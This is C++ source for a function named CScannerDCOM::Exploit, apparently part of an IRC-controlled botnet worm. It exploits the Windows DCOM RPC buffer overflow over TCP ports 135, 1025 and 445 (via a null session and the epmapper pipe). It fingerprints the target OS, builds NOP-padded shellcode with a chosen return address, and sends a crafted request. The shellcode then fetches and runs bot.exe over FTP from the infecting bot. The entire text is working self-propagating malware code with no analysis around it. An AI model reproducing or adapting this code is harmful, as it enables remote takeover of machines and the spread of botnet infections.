bool CScannerDCOM::Exploit()
{
	switch(m_sSocket.m_sPort)
	{
	case 135:
	case 1025:
		{
			char szRecvBuf[4096]; char szSCBuf[4096]; char szReqBuf[4096]; char szShellBuf[4096];
			int iShellSize=0, iPos=0, iSCSize=0, iReqSize=0, iNOPSize=sizeof(nops)-1;
			char *pTemp; int iHostOS=FpHost(m_sSocket.m_szHost, FP_RPC);
			if(iHostOS==OS_UNKNOWN) iHostOS=FpHost(m_sSocket.m_szHost, FP_SMB);
			if(iHostOS==OS_WINNT) return false;
			
			CString sURL;

			if(IsPrivate(g_pMainCtrl->m_cIRC.m_sLocalIp.CStr()) && !IsPrivate(m_sSocket.m_szHost))
				sURL.Format("ftp://*****:*****@%s:%d/bot.exe", g_pMainCtrl->m_cIRC.m_sLocalHost.CStr(), \
					g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue);
			else
				sURL.Format("ftp://*****:*****@%s:%d/bot.exe", inet_ntoa(to_in_addr(g_pMainCtrl->m_cIRC.m_lLocalAddr)), \
					g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue);

			iShellSize=setup_shellcode_udtf(szShellBuf, sizeof(szShellBuf), sURL.Str(), false);
			

			// Build a buffer with the shellcode
			memcpy(szSCBuf+iPos,	shellcode_start,	sizeof(shellcode_start)-1	); iPos+=sizeof(shellcode_start)-1;
			memset(szSCBuf+iPos,	'\x90',				iNOPSize					); iPos+=iNOPSize;
			memcpy(szSCBuf+iPos,	szShellBuf,			iShellSize					); iPos+=iShellSize;
			iSCSize=iPos; iPos=0;

			// Prepend NOPs as long as shellcode doesn't fit RPC packet format
			while(iSCSize%16!=12)
			{	char *szTemp=(char*)malloc(iSCSize+1); iNOPSize++;
				memcpy(szSCBuf+iPos,	shellcode_start,	sizeof(shellcode_start)-1	); iPos+=sizeof(shellcode_start)-1;
				memset(szSCBuf+iPos,	'\x90',				iNOPSize					); iPos+=iNOPSize;
				memcpy(szSCBuf+iPos,	szShellBuf,			iShellSize					); iPos+=iShellSize;
				iSCSize=iPos; iPos=0; free(szTemp); }

			// Set the return address
			if(iHostOS==OS_WINXP || iHostOS==OS_UNKNOWN)
				memcpy(szSCBuf+36, (char*)&my_offsets[1], 4);
			else
				memcpy(szSCBuf+36, (char*)&my_offsets[0], 4);

			// Build the request
			memcpy(szReqBuf+iPos,	request1,			sizeof(request1)-1			); iPos+=sizeof(request1)-1;
			memcpy(szReqBuf+iPos,	request2,			sizeof(request2)-1			); iPos+=sizeof(request2)-1;
			memcpy(szReqBuf+iPos,	szSCBuf,			iSCSize						); iPos+=iSCSize;
			memcpy(szReqBuf+iPos,	request3,			sizeof(request3)-1			); iPos+=sizeof(request3)-1;
			memcpy(szReqBuf+iPos,	request4,			sizeof(request4)-1			); iPos+=sizeof(request4)-1;
			iReqSize=iPos;

			pTemp=szReqBuf+sizeof(request1)-1; // Fill the request with the right sizes
			*(unsigned long*)(pTemp)		= *(unsigned long*)(pTemp)		+ iSCSize / 2;
			*(unsigned long*)(pTemp+8)		= *(unsigned long*)(pTemp+8)	+ iSCSize / 2; pTemp=szReqBuf;
			*(unsigned long*)(pTemp+8)		= *(unsigned long*)(pTemp+8)	+ iSCSize - 12;
			*(unsigned long*)(pTemp+16)		= *(unsigned long*)(pTemp+16)	+ iSCSize - 12;
			*(unsigned long*)(pTemp+128)	= *(unsigned long*)(pTemp+128)	+ iSCSize - 12;
			*(unsigned long*)(pTemp+132)	= *(unsigned long*)(pTemp+132)	+ iSCSize - 12;
			*(unsigned long*)(pTemp+180)	= *(unsigned long*)(pTemp+180)	+ iSCSize - 12;
			*(unsigned long*)(pTemp+184)	= *(unsigned long*)(pTemp+184)	+ iSCSize - 12;
			*(unsigned long*)(pTemp+208)	= *(unsigned long*)(pTemp+208)	+ iSCSize - 12;
			*(unsigned long*)(pTemp+396)	= *(unsigned long*)(pTemp+396)	+ iSCSize - 12;
			
			// Connect to the server
			if(!m_sSocket.Connect(m_sSocket.m_szHost, m_sSocket.m_sPort)) // Connect failed, exit
				return false;
			// Send the bind string
			if(!m_sSocket.Write(bindstr, sizeof(bindstr)-1)) { m_sSocket.Disconnect(); return false; }
			// Read reply
			m_sSocket.RecvTO(szRecvBuf, sizeof(szRecvBuf), 5000);
			// Send the evil request
			if(!m_sSocket.Write(szReqBuf, iReqSize)) { m_sSocket.Disconnect(); return false; }
			// Read reply
			if(!m_sSocket.RecvTO(szRecvBuf, sizeof(szRecvBuf), 5000)) { m_sSocket.Disconnect(); return false; }

			// Close the socket that was once funky fresh
			m_sSocket.Disconnect(); return true;
		}
		break;
	case 445:
		{
#ifdef _WIN32
			NETRESOURCEW nr; bool bRetVal=false;
			if(!ConnectViaNullSession(m_sSocket.m_szHost, &nr)) return bRetVal;
			else
			{	int iHostOS=FpHost(m_sSocket.m_szHost, FP_NP);
				if(iHostOS==OS_UNKNOWN) iHostOS=FpHost(m_sSocket.m_szHost, FP_SMB);
				char szPipePath[MAX_PATH];
				sprintf(szPipePath, "\\\\%s\\pipe\\epmapper", m_sSocket.m_szHost);
    
				HANDLE hFile=CreateFile(szPipePath, GENERIC_WRITE|GENERIC_READ, FILE_SHARE_READ, \
					NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  
				if(hFile!=INVALID_HANDLE_VALUE)
				{	
					SendLocal("%s: connected to pipe \\\\%s\\pipe\\epmapper.", m_sScannerName.CStr(), m_sSocket.m_szHost);
					char szSCBuf[4096]; char szReqBuf[4096]; char szShellBuf[4096];
					int iShellSize=0, iPos=0, iSCSize=0, iReqSize=0, iNOPSize=sizeof(nops)-1;
					char *pTemp;

					CString sURL;

					if(IsPrivate(g_pMainCtrl->m_cIRC.m_sLocalIp.CStr()) && !IsPrivate(m_sSocket.m_szHost))
						sURL.Format("ftp://*****:*****@%s:%d/bot.exe", g_pMainCtrl->m_cIRC.m_sLocalHost.CStr(), \
							g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue);
					else
						sURL.Format("ftp://*****:*****@%s:%d/bot.exe", inet_ntoa(to_in_addr(g_pMainCtrl->m_cIRC.m_lLocalAddr)), \
							g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue);

					iShellSize=setup_shellcode_udtf(szShellBuf, sizeof(szShellBuf), sURL.Str(), false);
					
					// Build a buffer with the shellcode
					memcpy(szSCBuf+iPos,	shellcode_start,	sizeof(shellcode_start)-1	); iPos+=sizeof(shellcode_start)-1;
					memset(szSCBuf+iPos,	'\x90',				iNOPSize					); iPos+=iNOPSize;
					memcpy(szSCBuf+iPos,	szShellBuf,			iShellSize					); iPos+=iShellSize;
					iSCSize=iPos; iPos=0;

					// Prepend NOPs as long as shellcode doesn't fit RPC packet format
					while(iSCSize%16!=12)
					{	char *szTemp=(char*)malloc(iSCSize+1); iNOPSize++;
						memcpy(szSCBuf+iPos,	shellcode_start,	sizeof(shellcode_start)-1	); iPos+=sizeof(shellcode_start)-1;
						memset(szSCBuf+iPos,	'\x90',				iNOPSize					); iPos+=iNOPSize;
						memcpy(szSCBuf+iPos,	szShellBuf,			iShellSize					); iPos+=iShellSize;
						iSCSize=iPos; iPos=0; free(szTemp); }

					// Set the return address
					if(iHostOS==OS_WINXP || iHostOS==OS_UNKNOWN)
						memcpy(szSCBuf+36, (char*)&my_offsets[1], 4);
					else
						memcpy(szSCBuf+36, (char*)&my_offsets[0], 4);

					// Build the request
					memcpy(szReqBuf+iPos,	request1,			sizeof(request1)-1			); iPos+=sizeof(request1)-1;
					memcpy(szReqBuf+iPos,	request2,			sizeof(request2)-1			); iPos+=sizeof(request2)-1;
					memcpy(szReqBuf+iPos,	szSCBuf,			iSCSize						); iPos+=iSCSize;
					memcpy(szReqBuf+iPos,	request3,			sizeof(request3)-1			); iPos+=sizeof(request3)-1;
					memcpy(szReqBuf+iPos,	request4,			sizeof(request4)-1			); iPos+=sizeof(request4)-1;
					iReqSize=iPos;

					pTemp=szReqBuf+sizeof(request1)-1; // Fill the request with the right sizes
					*(unsigned long*)(pTemp)		= *(unsigned long*)(pTemp)		+ iSCSize / 2;
					*(unsigned long*)(pTemp+8)		= *(unsigned long*)(pTemp+8)	+ iSCSize / 2; pTemp=szReqBuf;
					*(unsigned long*)(pTemp+8)		= *(unsigned long*)(pTemp+8)	+ iSCSize - 12;
					*(unsigned long*)(pTemp+16)		= *(unsigned long*)(pTemp+16)	+ iSCSize - 12;
					*(unsigned long*)(pTemp+128)	= *(unsigned long*)(pTemp+128)	+ iSCSize - 12;
					*(unsigned long*)(pTemp+132)	= *(unsigned long*)(pTemp+132)	+ iSCSize - 12;
					*(unsigned long*)(pTemp+180)	= *(unsigned long*)(pTemp+180)	+ iSCSize - 12;
					*(unsigned long*)(pTemp+184)	= *(unsigned long*)(pTemp+184)	+ iSCSize - 12;
					*(unsigned long*)(pTemp+208)	= *(unsigned long*)(pTemp+208)	+ iSCSize - 12;
					*(unsigned long*)(pTemp+396)	= *(unsigned long*)(pTemp+396)	+ iSCSize - 12;

					unsigned long lWritten; char *szInBuf=(char*)malloc(100000); memset(szInBuf, 0, 100000);
					// Send the bind string
					DWORD dwRead; TransactNamedPipe(hFile, bindstr, sizeof(bindstr)-1, szInBuf, 10000, &dwRead, NULL);
					if(szInBuf[2]!=0x0C) { CloseHandle(hFile); CloseNullSession(m_sSocket.m_szHost); return bRetVal; }
					// Send the evil request
					if(!WriteFile(hFile, szReqBuf, iReqSize, &lWritten, 0)) { CloseHandle(hFile); CloseNullSession(m_sSocket.m_szHost); return bRetVal; }
					if(!ReadFile(hFile, szInBuf, 10000, &dwRead, NULL)) bRetVal=true; else bRetVal=false;
					free(szInBuf); }

				CloseHandle(hFile);
				CloseNullSession(m_sSocket.m_szHost); }
			return bRetVal;
#endif // _WIN32
		}
		break;
	default:
		return false;
		break;
	}

	return false;
}